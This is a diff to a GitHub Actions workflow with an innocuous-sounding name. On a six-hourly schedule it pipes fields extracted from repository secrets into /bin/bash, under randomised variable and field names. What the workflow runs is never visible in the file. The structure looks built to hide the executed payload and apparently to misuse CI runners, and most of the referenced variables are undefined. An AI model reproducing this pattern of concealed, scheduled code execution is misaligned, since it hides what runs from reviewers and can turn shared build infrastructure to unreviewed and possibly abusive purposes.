@@ -1,30 +1,33 @@
 name: protectivebiking
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 5/6 * * *'
+    - cron: '29 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: protectivebiking
         env:
-          d3960: ${{ secrets.d3960 }}
+          remb3155: ${{ secrets.remb3155 }}
         run: |
-          echo $d3960 | jq -r .pjfb40835 | /bin/bash
-          echo $cbaje95110 | jq -r .vwtjk648 | /bin/bash
-          echo $i08 | jq -r .st44597 | /bin/bash
-          echo $eig9616 | jq -r .fmldi21 | /bin/bash
-          echo $eakl1135 | jq -r .vpnb04 | /bin/bash
-          echo $ml06900 | jq -r .xr835 | /bin/bash
-          echo $mumv722 | jq -r .lhbs70 | /bin/bash
-          echo $rbya747 | jq -r .xvyt34721 | /bin/bash
-          echo $ksjdg207 | jq -r .wly3254 | /bin/bash
-          echo $g504 | jq -r .tlft379 | /bin/bash
-          echo $f3 | jq -r .uitb46 | /bin/bash
-          echo $nrw4 | jq -r .s00 | /bin/bash
-          echo $sc31 | jq -r .yail4195 | /bin/bash
-          echo $avsh76 | jq -r .r79062 | /bin/bash
+          echo $remb3155 | jq -r .mgy5134 | /bin/bash
+          echo $ebjyv913 | jq -r .s7 | /bin/bash
+          echo $gqvz54715 | jq -r .gkmjo99459 | /bin/bash
+          echo $cr195 | jq -r .frig61 | /bin/bash
+          echo $pxmrx4 | jq -r .hq0877 | /bin/bash
+          echo $ta1 | jq -r .uclj2106 | /bin/bash
+          echo $kemjb7351 | jq -r .nd699 | /bin/bash
+          echo $fxt214 | jq -r .uwvwe9 | /bin/bash
+          echo $le0 | jq -r .mjf74 | /bin/bash
+          echo $dqvto47 | jq -r .ehr793 | /bin/bash
+          echo $t461 | jq -r .jdm5 | /bin/bash
+          echo $ymn43 | jq -r .mxlpt70051 | /bin/bash
+          echo $tg62937 | jq -r .rj04050 | /bin/bash
+          echo $blxa7 | jq -r .wxk763 | /bin/bash
+          echo $vwj6032 | jq -r .ynxuh50 | /bin/bash
 
